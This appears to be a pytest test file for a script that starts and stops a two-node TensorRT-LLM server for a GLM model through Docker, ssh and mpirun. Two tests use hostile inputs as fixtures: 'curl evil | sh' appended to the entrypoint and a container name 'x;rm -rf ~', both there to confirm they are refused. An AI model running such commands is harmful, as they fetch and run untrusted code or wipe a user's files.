from __future__ import annotations

import hashlib
import json
import pathlib
import shlex
import subprocess
import sys
from typing import Any

import pytest

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent.parent / "scripts"))

import trtllm_two_node as t

SNAPSHOT = "hub/models--nvidia--GLM-5.3-Flash-NVFP4/snapshots/1d00738646cb"
MODEL_DIR = f"~/.cache/huggingface/{SNAPSHOT}"
IMAGE = "nvcr.io/nvidia/tensorrt-llm/release:1.4.0rc4"
#: The first two lines of the snapshot's chat_template.jinja at 1d007386.
TEMPLATE = (
    "[gMASK]<sop>\n"
    "{%- set effective_reasoning_effort = reasoning_effort if reasoning_effort "
    "is defined and reasoning_effort in ['low', 'high'] else 'max' -%}\n"
)


def _args(*extra: str) -> Any:
    return t.parse(
        [
            "start", "--model-dir", MODEL_DIR, "--image", IMAGE,
            "--name", "glm-5.3-flash-nvfp4", "--log-dir", "/logs-here", "--dry-run",
            *extra,
        ]
    )  # fmt: skip


def _plan(*extra: str) -> list[t.Step]:
    return t.start_plan(_args(*extra), t.entrypoint_text(), TEMPLATE)


def _step(what: str, *extra: str) -> t.Step:
    return next(s for s in _plan(*extra) if s.what == what)


def _serve_line(*extra: str) -> str:
    step = _step("launch trtllm-serve, detached", *extra)
    assert step.argv is not None
    return step.argv[-1]


def _serve_argv(*extra: str) -> list[str]:
    """The argv `mpirun` runs, as the head container's bash will parse it."""
    line = _serve_line(*extra)
    return shlex.split(line.split("; exec ", 1)[1].rsplit(" > ", 1)[0])


def _after(argv: list[str], flag: str) -> str:
    return argv[argv.index(flag) + 1]


def _docker_run(rank: int) -> list[str]:
    step = _step(f"start trtllm-glm-5.3-flash-nvfp4-rank{rank} on the "
                 + ("head" if rank == 0 else "worker"))  # fmt: skip
    assert step.argv is not None
    return shlex.split(step.argv[-1])


def _env(argv: list[str]) -> dict[str, str]:
    pairs = [argv[i + 1] for i, a in enumerate(argv) if a == "-e"]
    return dict(p.split("=", 1) for p in pairs)


# --- order --------------------------------------------------------------------


def test_the_worker_starts_before_the_head_and_the_api_wait_comes_last() -> None:
    whats = [s.what for s in _plan()]
    worker = whats.index("start trtllm-glm-5.3-flash-nvfp4-rank1 on the worker")
    head = whats.index("start trtllm-glm-5.3-flash-nvfp4-rank0 on the head")
    waits = [i for i, s in enumerate(_plan()) if s.action in ("sshd0", "sshd1")]
    launch = whats.index("launch trtllm-serve, detached")
    assert worker < head < min(waits) and max(waits) < launch
    assert _plan()[-1].action == "ready"
    assert launch == len(whats) - 2


def test_the_worker_is_started_over_ssh_and_the_head_locally() -> None:
    plan = _plan()
    assert plan[0].argv is not None and plan[0].argv[:4] == [
        "ssh", "-o", "BatchMode=yes", "10.0.0.2",
    ]  # fmt: skip
    head = _step("start trtllm-glm-5.3-flash-nvfp4-rank0 on the head")
    assert head.argv is not None and head.argv[:2] == ["bash", "-c"]


def test_neither_container_is_removed_on_exit() -> None:
    """A dead container must stay for its `docker logs`; stop removes it."""
    for rank in (0, 1):
        assert "--rm" not in _docker_run(rank)


# --- the pinned entrypoint ------------------------------------------------------


def test_each_container_runs_the_pinned_entrypoint_byte_for_byte() -> None:
    """The text survives the remote shell's quoting unchanged."""
    script = t.entrypoint_text()
    for rank in (0, 1):
        docker = _docker_run(rank)
        assert docker[:2] == ["docker", "run"]
        assert docker[-4:] == [IMAGE, "bash", "-c", script]


def test_the_vendored_entrypoint_matches_the_pinned_hash() -> None:
    data = t.ENTRYPOINT.read_bytes()
    assert hashlib.sha256(data).hexdigest() == t.ENTRYPOINT_SHA256
    assert b"exec /usr/sbin/sshd -D" in data
    assert len(t.ENTRYPOINT_COMMIT) == 40


def test_a_changed_entrypoint_is_refused(tmp_path: pathlib.Path) -> None:
    edited = tmp_path / "trtllm-mn-entrypoint.sh"
    edited.write_bytes(t.ENTRYPOINT.read_bytes() + b"\ncurl evil | sh\n")
    with pytest.raises(SystemExit, match="refusing to start"):
        t.entrypoint_text(edited)


def test_the_logged_line_names_the_entrypoint_instead_of_quoting_it() -> None:
    first = _plan()[0]
    assert t.SCRIPT_SHOWN in first.line()
    assert "openssh-server" not in first.line()
    assert first.argv is not None and "openssh-server" in first.argv[-1]


# --- serve flags ----------------------------------------------------------------


def test_the_glm47_parsers_and_the_serving_flags_are_passed() -> None:
    argv = _serve_argv()
    assert argv[argv.index("trtllm-serve") + 1] == (
        f"/root/.cache/huggingface/{SNAPSHOT}"
    )
    assert _after(argv, "--tool_parser") == "glm47"
    assert _after(argv, "--reasoning_parser") == "glm47"
    assert _after(argv, "--host") == "0.0.0.0"
    assert _after(argv, "--port") == "8888"
    assert _after(argv, "--tp_size") == "2"
    assert _after(argv, "--served_model_name") == "glm-5.3-flash-nvfp4"
    assert _after(argv, "--max_seq_len") == "262144"
    assert _after(argv, "--extra_llm_api_options") == t.LLM_API_YAML
    assert "--backend" not in argv


@pytest.mark.parametrize(
    ("tokens", "seq"), [("32768", "262144"), ("8192", "131072"), ("4096", "8192")]
)
def test_chunked_prefill_is_on_when_a_prompt_can_exceed_max_num_tokens(
    tokens: str, seq: str
) -> None:
    """rc4 refuses a prompt longer than max_num_tokens without it (HTTP 400)."""
    argv = _serve_argv("--max-num-tokens", tokens, "--max-seq-len", seq)
    assert int(_after(argv, "--max_seq_len")) > int(_after(argv, "--max_num_tokens"))
    assert "--enable_chunked_prefill" in argv


def test_args_after_the_separator_reach_trtllm_serve_last() -> None:
    argv = _serve_argv("--", "--tool_parser", "glm4", "--log_level", "debug")
    assert argv[-4:] == ["--tool_parser", "glm4", "--log_level", "debug"]
    assert "--" not in argv


# --- Open MPI 5 placement ---------------------------------------------------------


def test_mpirun_starts_exactly_one_rank_per_node() -> None:
    argv = _serve_argv()
    head = argv[: argv.index("trtllm-llmapi-launch")]
    assert head[0] == "mpirun"
    assert _after(head, "-np") == "2"
    assert _after(head, "--map-by") == "ppr:1:node"
    assert _after(head, "--bind-to") == "none"
    assert _after(head, "--hostfile") == t.HOSTFILE
    assert "--allow-run-as-root" in head


def test_each_hostfile_line_has_one_slot() -> None:
    step = _step("write the MPI hostfile")
    assert step.argv is not None
    written = shlex.split(step.argv[-1])
    assert written[:2] == ["printf", "%s"]
    assert written[2].splitlines() == ["10.0.0.1 slots=1", "10.0.0.2 slots=1"]
    assert written[-2:] == [">", t.HOSTFILE]


def test_the_open_mpi_4_placement_variable_is_gone() -> None:
    env = _env(_docker_run(0))
    assert "OMPI_MCA_rmaps_ppr_n_pernode" not in env
    assert env["OMPI_ALLOW_RUN_AS_ROOT"] == env["OMPI_ALLOW_RUN_AS_ROOT_CONFIRM"] == "1"


def test_every_mpirun_export_is_set_in_the_head_container() -> None:
    """A rank started over SSH sees only what `-x` exports, and `-x NAME`
    exports the head container's value of NAME, so each must be set there."""
    argv = _serve_argv()
    exported = {argv[i + 1] for i, a in enumerate(argv) if a == "-x"}
    head_env = _env(_docker_run(0))
    assert exported, "mpirun exports nothing"
    assert exported <= set(head_env)
    assert {k for k in head_env if k.startswith("NCCL_")} <= exported
    assert head_env["NCCL_IB_HCA"].count(",") == 3


# --- reasoning effort -------------------------------------------------------------


def test_the_low_effort_template_changes_the_default_only() -> None:
    low = t.low_effort_template(TEMPLATE)
    assert "else 'low' -%}" in low and "else 'max'" not in low
    assert low.replace(t.TEMPLATE_LOW, t.TEMPLATE_DEFAULT) == TEMPLATE


@pytest.mark.parametrize("times", [0, 2])
def test_a_template_without_exactly_one_default_is_refused(times: int) -> None:
    text = "[gMASK]<sop>\n" + t.TEMPLATE_DEFAULT * times
    with pytest.raises(SystemExit, match="not once"):
        t.low_effort_template(text)


def test_the_server_gets_the_low_template() -> None:
    write = _step("write the low-effort chat template")
    assert write.stdin == TEMPLATE
    assert write.argv is not None and write.argv[-1] == f"cat > {t.CONTAINER_TEMPLATE}"
    check = _step("check the template holds the low default")
    assert check.argv is not None and t.TEMPLATE_LOW in check.argv
    assert _after(_serve_argv(), "--chat_template") == t.CONTAINER_TEMPLATE


# --- logs and records ---------------------------------------------------------------


def test_the_server_log_goes_to_the_mounted_log_dir() -> None:
    step = _step("launch trtllm-serve, detached")
    assert step.argv is not None and step.argv[:3] == ["docker", "exec", "-d"]
    line = step.argv[-1]
    assert line.startswith(f"echo $$ > {t.SERVE_PIDFILE}; exec mpirun ")
    assert line.endswith("> /logs/trtllm-glm-5.3-flash-nvfp4-rank0-serve.log 2>&1")
    assert "/logs-here:/logs" in _docker_run(0)
    assert not any(a.endswith(":/logs") for a in _docker_run(1))


def test_a_relative_log_dir_becomes_absolute(
    tmp_path: pathlib.Path, monkeypatch: pytest.MonkeyPatch
) -> None:
    """docker reads a relative -v source as a named volume."""
    monkeypatch.chdir(tmp_path)
    args = t.parse(["start", "--model-dir", MODEL_DIR, "--image", IMAGE,
                    "--name", "g", "--log-dir", "logs"])  # fmt: skip
    assert args.log_dir == str(tmp_path / "logs")


def test_the_serve_argv_is_recorded_beside_the_log() -> None:
    step = _step("record the serve argv")
    assert step.path == "/logs-here/trtllm-glm-5.3-flash-nvfp4-rank0-serve-argv.json"
    record = json.loads(step.text)
    assert record["server_argv"] == _serve_argv()
    assert record["image"] == IMAGE
    assert record["entrypoint_sha256"] == t.ENTRYPOINT_SHA256


def test_the_hub_cache_mounts_read_only_and_home_paths_stay_unquoted() -> None:
    line = _plan()[0].argv[-1]  # type: ignore[index]
    assert "-v ~/.cache/huggingface:/root/.cache/huggingface:ro" in line
    assert "-v ~/.ssh:/tmp/.ssh:ro" in line


def test_the_yaml_carries_the_kv_fraction() -> None:
    step = _step("write the LLM API options", "--kv-free-fraction", "0.7")
    assert step.argv is not None
    assert "free_gpu_memory_fraction: 0.7" in step.argv[-1]
    assert "enable_padding: true" in step.argv[-1]


def test_the_yaml_loads_the_model_text_only() -> None:
    # The first live start (2026-11-22) failed on both ranks without it: rc4
    # will not build GLM-5.3-Flash's vision encoder on the image's transformers.
    step = _step("write the LLM API options")
    assert step.argv is not None
    assert "\ndisable_mm_encoder: true\n" in step.argv[-1]


def test_a_model_dir_outside_the_hub_cache_is_refused() -> None:
    with pytest.raises(SystemExit, match="must sit under"):
        t.container_model_path("/models/elsewhere")


# --- names and stop -------------------------------------------------------------------


def test_stop_removes_both_containers() -> None:
    lines = [s.line() for s in t.stop_plan("glm")]
    assert lines[0] == "docker rm -f trtllm-glm-rank0"
    assert lines[1].startswith("ssh -o BatchMode=yes 10.0.0.2 ")
    assert shlex.split(lines[1])[-1] == "docker rm -f trtllm-glm-rank1"


@pytest.mark.parametrize("name", ["a b", "x;rm -rf ~", "-lead", "", "a/b"])
def test_a_name_docker_or_a_shell_would_misread_is_refused(name: str) -> None:
    for cmd in (["stop", "--name", name], ["start", "--model-dir", MODEL_DIR,
                                            "--image", IMAGE, "--name", name]):  # fmt: skip
        with pytest.raises(SystemExit):
            t.parse(cmd)


# --- pre-launch refusals ------------------------------------------------------------


def _facts(**over: list[str]) -> dict[str, list[str]]:
    facts = {"mem_kib": [str(110 * 2**20)], "model": ["1"], "shards": ["33"]}
    facts.update(over)
    return facts


def test_a_clean_node_has_no_refusals() -> None:
    assert t.refusals(_facts()) == []
    assert t.refusals(_facts(), head_shards="33") == []


@pytest.mark.parametrize(
    ("over", "head_shards", "fragment"),
    [
        ({"listen": ["0.0.0.0:2233"]}, "", "0.0.0.0:2233 is already listening"),
        ({"listen": ["*:8888"]}, "", "*:8888 is already listening"),
        ({"container": ["trtllm-old-rank0"]}, "", "trtllm-old-rank0 exists"),
        ({"gpu_app": ["123, python"]}, "", "a GPU process is running"),
        ({"mem_kib": [str(50 * 2**20)]}, "", "MemAvailable 50.0 GiB"),
        ({"mem_kib": []}, "", "MemAvailable 0.0 GiB"),
        ({"model": ["0"]}, "", "no config.json"),
        ({"shards": ["0"]}, "", "no .safetensors"),
        ({"shards": ["31"]}, "33", "holds 31 .safetensors files; the head has 33"),
    ],
)
def test_each_unsafe_node_state_is_refused(
    over: dict[str, list[str]], head_shards: str, fragment: str
) -> None:
    why = t.refusals(_facts(**over), head_shards=head_shards)
    assert any(fragment in w for w in why), why


def test_the_probe_reads_both_ports_and_the_snapshot() -> None:
    shell = t.facts_shell(SNAPSHOT, 8888)
    assert ":(2233|8888)$" in shell
    assert f'M="$HOME/.cache/huggingface/{SNAPSHOT}"' in shell
    assert "docker ps -a" in shell


def test_refusals_stop_the_start_before_any_container(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    ran: list[list[str]] = []

    def node(rank: int, command: str) -> subprocess.CompletedProcess[str]:
        out = "mem_kib=1\nmodel=1\nshards=33\n"
        return subprocess.CompletedProcess([], 0, out, "")

    monkeypatch.setattr(t, "on_node", node)
    monkeypatch.setattr(t, "read_template", lambda _a: TEMPLATE)
    monkeypatch.setattr("trtllm_two_node.subprocess.run", lambda a, **_k: ran.append(a))
    args = _args()
    args.dry_run = False
    assert t.start(args) == 1
    assert ran == []


# --- failure handling ---------------------------------------------------------------


def test_a_failure_after_the_worker_starts_removes_both_containers(
    monkeypatch: pytest.MonkeyPatch, tmp_path: pathlib.Path
) -> None:
    ran: list[list[str]] = []

    def run(argv: list[str], **_k: object) -> subprocess.CompletedProcess[str]:
        ran.append(argv)
        return subprocess.CompletedProcess(argv, 0, "", "")

    def sshd(rank: int, name: str) -> None:
        raise t.LaunchFailed("container stopped")

    monkeypatch.setattr(t, "check_nodes", lambda _a: True)
    monkeypatch.setattr(t, "read_template", lambda _a: TEMPLATE)
    monkeypatch.setattr(t, "wait_sshd", sshd)
    monkeypatch.setattr("trtllm_two_node.subprocess.run", run)
    args = _args("--log-dir", str(tmp_path))
    args.dry_run = False
    assert t.start(args) == 1
    removes = [a for a in ran if "rm" in a or any("docker rm -f" in x for x in a)]
    assert [a[-1] for a in removes] == [
        "trtllm-glm-5.3-flash-nvfp4-rank0",
        "docker rm -f trtllm-glm-5.3-flash-nvfp4-rank1",
    ]


def test_a_failed_worker_start_removes_nothing(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """The name may belong to a container this run did not start."""
    ran: list[list[str]] = []

    def run(argv: list[str], **_k: object) -> subprocess.CompletedProcess[str]:
        ran.append(argv)
        return subprocess.CompletedProcess(argv, 125, "", "")

    monkeypatch.setattr(t, "check_nodes", lambda _a: True)
    monkeypatch.setattr(t, "read_template", lambda _a: TEMPLATE)
    monkeypatch.setattr("trtllm_two_node.subprocess.run", run)
    args = _args()
    args.dry_run = False
    assert t.start(args) == 1
    assert len(ran) == 1


def test_the_api_wait_fails_fast_when_mpirun_is_gone(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def node(rank: int, command: str) -> subprocess.CompletedProcess[str]:
        running = "State.Running" in command
        return subprocess.CompletedProcess([], 0 if running else 1, "true\n", "")

    monkeypatch.setattr(t, "on_node", node)
    monkeypatch.setattr(t, "models_answer", lambda _p, _n: False)
    with pytest.raises(t.LaunchFailed, match="mpirun exited"):
        t.wait_ready(_args())


def test_the_api_wait_fails_fast_when_the_head_container_stops(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def node(rank: int, command: str) -> subprocess.CompletedProcess[str]:
        return subprocess.CompletedProcess([], 0, "false\n", "")

    monkeypatch.setattr(t, "on_node", node)
    monkeypatch.setattr(t, "models_answer", lambda _p, _n: False)
    with pytest.raises(t.LaunchFailed, match="stopped while the server loaded"):
        t.wait_ready(_args())


def test_the_sshd_wait_fails_fast_when_the_container_stops(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def node(rank: int, command: str) -> subprocess.CompletedProcess[str]:
        out = "false\n" if "State.Running" in command else "apt-get failed"
        return subprocess.CompletedProcess([], 0, out, "")

    def refuse(*_a: object, **_k: object) -> None:
        raise OSError("refused")

    monkeypatch.setattr(t, "on_node", node)
    monkeypatch.setattr("trtllm_two_node.socket.create_connection", refuse)
    with pytest.raises(t.LaunchFailed, match="apt-get failed"):
        t.wait_sshd(1, "glm")


# --- dry run --------------------------------------------------------------------------


@pytest.mark.parametrize("cmd", ["start", "stop"])
def test_a_dry_run_runs_nothing(monkeypatch: pytest.MonkeyPatch, cmd: str) -> None:
    def refuse(*_a: object, **_k: object) -> None:
        raise AssertionError("a dry run ran a command")

    monkeypatch.setattr("trtllm_two_node.subprocess.run", refuse)
    monkeypatch.setattr(t, "on_node", refuse)
    monkeypatch.setattr(t, "wait_sshd", refuse)
    monkeypatch.setattr(t, "wait_ready", refuse)
    if cmd == "start":
        argv = [
            "start", "--model-dir", MODEL_DIR, "--image", IMAGE,
            "--name", "glm", "--dry-run",
        ]  # fmt: skip
    else:
        argv = ["stop", "--name", "glm", "--dry-run"]
    assert t.main(argv) == 0
